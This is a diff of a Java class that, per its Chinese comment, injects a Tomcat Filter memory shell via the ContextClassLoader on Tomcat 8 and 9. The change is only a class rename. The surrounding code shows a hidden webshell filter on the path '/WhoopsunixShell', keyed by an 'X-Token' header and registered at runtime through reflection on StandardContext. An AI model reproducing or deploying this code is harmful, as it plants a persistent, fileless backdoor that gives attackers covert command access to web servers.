@@ -13,12 +13,12 @@ import java.lang.reflect.Method;
  * ContextClassLoader 注入 Tomcat Filter 型内存马
  * Tomcat 8 9
  */
-public class TomcatFilterContextClassMS implements Filter {
+public class TomcatFilterWebAppMS implements Filter {
     private static String NAME = "TomcatServletThreadMS";
     private static String pattern = "/WhoopsunixShell";
     private static String header = "X-Token";
 
-    public TomcatFilterContextClassMS() {
+    public TomcatFilterWebAppMS() {
 
     }
 
@@ -44,7 +44,7 @@ public class TomcatFilterContextClassMS implements Filter {
 //            org.apache.tomcat.util.descriptor.web.FilterDef filterDef = standardContext.findFilterDef(NAME);
             Object filterDef = standardContext.getClass().getDeclaredMethod("findFilterDef", String.class).invoke(standardContext, NAME);
             if (filterDef == null) {
-                TomcatFilterContextClassMS filterMemShell = new TomcatFilterContextClassMS();
+                TomcatFilterWebAppMS filterMemShell = new TomcatFilterWebAppMS();
 //                // M1 ApplicationContext 方式注册
 //                // 修改 state 状态
 //                setFieldValue(standardContext, "state", org.apache.catalina.LifecycleState.STARTING_PREP);
